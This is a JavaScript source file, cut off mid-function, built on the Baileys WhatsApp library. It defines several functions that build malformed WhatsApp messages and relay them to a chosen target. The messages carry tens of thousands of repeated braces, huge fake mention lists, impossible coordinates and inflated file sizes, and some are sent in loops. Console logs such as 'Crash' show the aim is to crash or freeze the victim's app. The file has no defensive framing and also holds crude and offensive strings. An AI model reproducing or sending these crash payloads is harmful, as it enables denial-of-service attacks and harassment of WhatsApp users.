const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap
} = require("@whiskeysockets/baileys"); 

const fs = require('fs');  
const ImgCrL = fs.readFileSync('./ImgCrL.jpg')
const crypto = require('crypto');

function generateRandomString(string) {
      return "" + Math.floor(Math.random() * 10000) + string;
    }
    
async function ControlFlow2(client, target, slide) {
  const cards = [];
  const header = {
     videoMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0&mms3=true",
       mimetype: "video/mp4",
       fileSha256: "/pV21pNhkihyDh9p3Hq5wt7yhm8936pnjQqKre9lKpY=",
       fileLength: 3714175,
       seconds: 19,
       mediaKey: "LQ4w55EW8uoSwW/K7ejT0X++UhZIvP8pqrFkO7B/e50=",
       height: 576,
       width: 768,
       fileEncSha256: "BKuE23WWqS72GgIoJHmTGefyqUADW2hdeIlUBa15Oh4=",
       directPath: "/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0",
       mediaKeyTimestamp: "1751466051",
       jpegThumbnail: "",
       contextInfo: {},
       streamingSidecar: "ypvxlTyuR3uzb1giNyNVUaHeJ40v9lL2IjwfM8njf+m2lvqWGcKb6L6IRiH6TiajAWpnj2z4ZsC6klWL6l2NkB65g8U+qXMyjADFSGOuG9LBI/jmx7h9vlpXjSgxZOLVy29HBS2vhjj8V1IglDR47GrAz0UZqcDuotGa/vJmSg5lKMpxxJqzvJth0h4spVX2pcH2aIVZnWkaHh2a+7BukY6hXN1A/or+VvhZyauto6anYMWAcnACcWP9dyBKYa1B7Ss7Vnu86uqUbQmyyNgePCipB9sundP9iq4RHBiR1RxFfrv990U+hYUPE0kbBtD1zfK9x+gmf1I9Cav0sP64xnWQ8TrhalUjTE2mVFfQqn8ZkY4IKwOpOgWzacImLK6j0Pj78jyibNShmDBlmG61QOMKfwVW4ZDw3M7kI1/1TJ3uKBXYzLlAs36BowfErSIrgEbU+OSA1g2Ay4qwH+k5mjkOLVnW3dshIjCdxsHUTTLQpQGnBrh+sARmOWL8UHjJOKCh/7lQZqx3Vv7ZOt13ry44AR2aRPEO7VkYpX4oOWhKyjJIgHpZXPddrZLL3s/yGVecfpP9F80HfuB5ieery0Ai0klbruXlB9JDrd2w2477587Djifcsqqdqwurc6DTvWaEaTZTCsHMAyuQCOLIoTY0fWvotA7oIW/eVYb8LwdJzjzVbswVl4XoWkc+nJBKJFcQ7PE/kRKe6aWyqARaY/XxPUmLrEWPrqLbn1yY8a6yICH2dmq+3Sf5"
    }, 
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "Yuukey" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "</𖥂 𝙔𝙪𝙪𝙠𝙚𝙮 𝙕𝙚𝙥𝙥𝙚𝙡𝙞 𖥂\\>",
          contextInfo: {
            mentionedJid: ["13135550202@s.whatsapp.net"],
            externalAdReply: {
              title: "{ Yuukey.pedo.lite }",
              body: "",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://nekopoi/care",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let y = 0; y < slide; y++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "</𖥂 𝙔𝙪𝙪𝙠𝙚𝙮 𝙕𝙚𝙥𝙥𝙚𝙡𝙞 𖥂\\>"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              isGroupMention: true, 
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550202@s.whatsapp.net"
              },
              stanzaId: "Yuukey" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550202@s.whatsapp.net"], // trigger
              externalAdReply: {
                title: "Yuukey Da",
                body: "",
                thumbnailUrl: "https://nekopoi/care",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://Yuukey.{{{{{{{{{.id/kontol?exambling=Yuukey",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await client.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}    

async function TripXMed2(client, target, ammount) {
  for (let r = 0; r < ammount; r++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: '</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>',
                locationMessage: {
                  degreesLatitude: 999999999,
                  degreesLongitude: -999999999,
                  name: '{'.repeat(100000),
                  address: '{'.repeat(100000)
                }
              },
              body: { text: "" },
              footer: { text: "{ 𝑲𝒊𝒍𝒍𝒆𝒓 𝑸𝒖𝒆𝒓𝒏 𝑽𝟏𝟎 }" },
              nativeFlowMessage: {
                messageParamsJson: '{'.repeat(30000)
              },
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
                fileSha256: Buffer.from("ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=", "base64"),
                fileLength: "974197419741",
                pageCount: "974197419741",
                mediaKey: Buffer.from("5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=", "base64"),
                fileName: "</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>".repeat(7000),
                fileEncSha256: Buffer.from("pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=", "base64"),
                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173"
              },
              imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "o2Eb2bT8YhZ8cqXOEYAognoQD/PsaEjg8FE9NbF9tDs=",
                fileLength: "182328",
                height: 1280,
                width: 1280,
                mediaKey: "npSqB+cuTkghZ2rifzzMQkhyUf5d8Iwa+5HlHGL3tcA=",
                caption: "</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>",
                fileEncSha256: "nQZ221+c8J3gzT77f7Li33klE8TagaSjA7AM55arqLA=",
                directPath: "/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1750938694",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
                }
              }
            }
          }
      };
      
      const msg = await generateWAMessageFromContent(target, message, { quoted: null });
      
      await client.relayMessage(target, msg.message, {
       participant:
      { jid:target }, 
        messageId: msg.key.id
      });
      
      console.log(`✅ Crash ${target}`);
    } catch (err) {
      console.error("❌ Gagal crash:", err);
    }
  }
}

async function CrlSqL(client, target) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { video: { url: "https://files.catbox.moe/bzx583.mp4" }},
    { upload: client.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "FnX-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "🧬⃟༑⌁⃰𝐓͈𝐚𝐦͢𝐚 𝐂𝐨𝐧ͯ͢𝐜𝐮͢𝐞𝐫𝐫𝐨𝐫ཀ͜͡🪅",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "Finix AI Broadcast",
              body: "Trusted System",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://tama.example.com",
              showAdAttribution: false // trigger 1
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "FnX" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "Finix Engine",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://finix-ai.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await client.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function locameral(client, target) {
      let msg = generateWAMessageFromContent(target, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "꙳͙͡༑ᐧزهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
                  address: "زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
                  jpegThumbnail: null
                },
                hasMediaAttachment: false
              },
              body: {
                text: "꙳͙͡༑ᐧ ̬..زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي  :: ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ :: >☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
                buttons: []
              }
            }
          }
        }
      }), {
        userJid: target,
        quoted: null
      });
      await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });
    }
    
async function locationfc(client, X, ptcp = true) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🦄クラッシャーDxyxzoo",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "🦅クラッシャーRynXzoo",
                address: "🦅クラッシャーRynXzoo",
              }, 
            },
            body: {
              text: "🦅クラッシャーЯey Ήanashi Σxecution ",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: X,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    }; 

    await client.relayMessage(X, message, {
      messageId: null,
      participant: { jid: X },
      userJid: X,
    });
  } catch (err) {
    console.log(err);
  }
}

async function freezeLogoTest(client, target) {
  console.log("🚀 Sending freeze test payload...");

  // 1. Mention list 10.000 orang palsu
  const mentions = [
    "6281234567890@s.whatsapp.net",
    ...Array.from({ length: 10000 }, () =>
      `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
    )
  ];

  // 2. Embedded music with extremely long author
  const embeddedMusic = {
    title: "CosmoNenen",
    author: "FREEZE".repeat(5000),
    isExplicit: true
  };

  // 3. Build videoMessage
  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/bugvideo.enc",
    mimetype: "video/mp4",
    caption: "Test your WA Mod Crash 🤡",
    height: 640,
    width: 640,
    seconds: 15,
    contextInfo: {
      mentionedJid: mentions
    },
    annotations: [
      {
        embeddedContent: {
          embeddedMusic
        },
        embeddedAction: true
      }
    ],
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "WA FREEZE TEST"
    }
  };

  // 4. Wrap in View Once
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: { videoMessage }
    }
  }, {});

  // 5. Relay
  await client.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });

  console.log("✅ Freeze test payload sent!");
}

async function locaepheflow(client, target) {
      let msg = generateWAMessageFromContent(target, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "꙳͙͡༑ᐧزهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
                  address: "زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
                  jpegThumbnail: null
                },
                hasMediaAttachment: false
              },
              body: {
                text: "꙳͙͡༑ᐧ ̬..زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي  :: ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ :: >☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
                buttons: []
              },
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0PayloadFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "ZynXzo New",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z"
              },
              hasMediaAttachment: true
            }
          }
        }
      }), {
        userJid: target,
        quoted: null
      });
      await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });
    };

async function opuswebp(client, target, mention = false) {
      let conditional = true;
      let mms = "5e03e0&mms3";
      let encmedia = "10000000_2012297619515179_5714769099548640934_n.enc";
      let format = "image/webp";
      if (11 > 9) {
        conditional = conditional ? false : true;
      }
      let cryptohex = (await crypto.randomBytes(16)).toString("hex");
      let opusaud1 = {
        tag: "audio",
        attrs: {
          enc: "opus",
          rate: "16000"
        }
      };
      let opusaud2 = {
        tag: "audio",
        attrs: {
          enc: "opus",
          rate: "8000"
        }
      };
      let net3 = {
        tag: "net",
        attrs: {
          medium: "3"
        },
        content: "3"
      };
      let capability1 = {
        tag: "capability",
        attrs: {
          ver: "1"
        },
        content: "AAAAAA=="
      };
      let encop2 = {
        tag: "encopt",
        attrs: {
          keygen: "2"
        }
      };
      let Msg1 = [opusaud1, opusaud2, net3, capability1, encop2];
      const aray0 = moving => {
        const pushobject = [];
        let numb = 0;
        while (numb < moving - 25) {
          const jidList = Math.floor(Math.random() * 10000000000).toString().padStart(10, "0");
          const mentionedJid = "91" + jidList + "@s.whatsapp.net";
          pushobject.push(mentionedJid);
          numb += mentionedJid.length + 3;
        }
        return pushobject;
      };
      const keynumb = 1074689;
      const newobj = aray0(keynumb);
      try {
        for (let dxy = 0; dxy < 1000; dxy++) {
          await delay(3000);
          let Msg2 = await generateWAMessageFromContent(target, {
            extendedTextMessage: {
              text: "",
              contextInfo: {
                stanzaId: client.generateMessageTag(),
                participant: "0@s.whatsapp.net",
                remoteJid: "696969696969@s.whatsapp.net",
                mentionedJid: ["0@s.whatsapp.net", ...Array.from({
                  length: 40000
                }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
                groupMentions: [],
                entryPointConversionSource: "non_contact",
                entryPointConversionApp: "whatsapp",
                entryPointConversionDelaySeconds: 467593,
                fromMe: false,
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target
                },
                quotedMessage: {
                  viewOnceMessage: {
                    message: {
                      interactiveResponseMessage: {
                        body: {
                          text: "⛧⛧⨭ᕈ̶ᖇ͠Ꙇ̋ᙏ͠ᖇOᔑ͓ᙓ ᖇ̶ᙓƳƳ̋͢⛧⛧ ::: ⛧⛧⨭ᕈ̶ᖇ͠Ꙇ̋ᙏ͠ᖇOᔑ͓ᙓ ᖇ̶ᙓƳƳ̋͢⛧⛧",
                          format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                          name: "review_and_pay",
                          paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"Gods\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                          version: 3
                        }
                      }
                    }
                  }
                }
              }
            }
          }, {});
          await client.relayMessage("status@broadcast", Msg2.message, {
            messageId: Msg2.key.id,
            statusJidList: [target],
            additionalNodes: [{
              tag: "meta",
              attrs: {},
              content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                  tag: "to",
                  attrs: {
                    jid: target
                  },
                  content: undefined
                }]
              }]
            }]
          });
          let array1 = [];
          for (let dxy1 = 0; dxy1 < 1000; dxy1++) {
            array1.push({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: ""
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: ""
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: "",
                hasMediaAttachment: true,
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&mms3=true",
                  mimetype: "image/jpeg",
                  fileSha256: "tcHyO7wrPPNctPRoi7x669hT8YEM0oB4Av25pSeG1cQ=",
                  fileLength: "73384124",
                  height: 1,
                  width: 1,
                  mediaKey: "/WtTeZEAvMxYIHa4hIrcGExALsiU3CKLMT3lqwNd8yk=",
                  fileEncSha256: "BgKFWKbH4aeiME5GrSg/sinfE8Z96dX7Utm1OjmEXXM=",
                  directPath: "/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&_nc_hot=1697385259",
                  mediaKeyTimestamp: "1697384837",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAAvAAACAwEAAAAAAAAAAAAAAAAAAgEDBQQBAQEBAQEAAAAAAAAAAAAAAAABAgME/9oADAMBAAIQAxAAAADtfj6vRxsmprJBpaZueqDoJeLqz+/JmUWBpRXSJbDjDjsxjOtxsdzTMHqivfx1NoxgzxoyVbCKdDlhrXtw2zdsyxWqDvyrA4ogFaQhALf/xAAkEAACAgICAQQDAQAAAAAAAAAAAQIRAxIEMSEQExRRIzJCof/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z"
                }
              })
            });
          }
          Msg2 = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                  body: proto.Message.InteractiveMessage.Body.create({
                    text: "\0"
                  }),
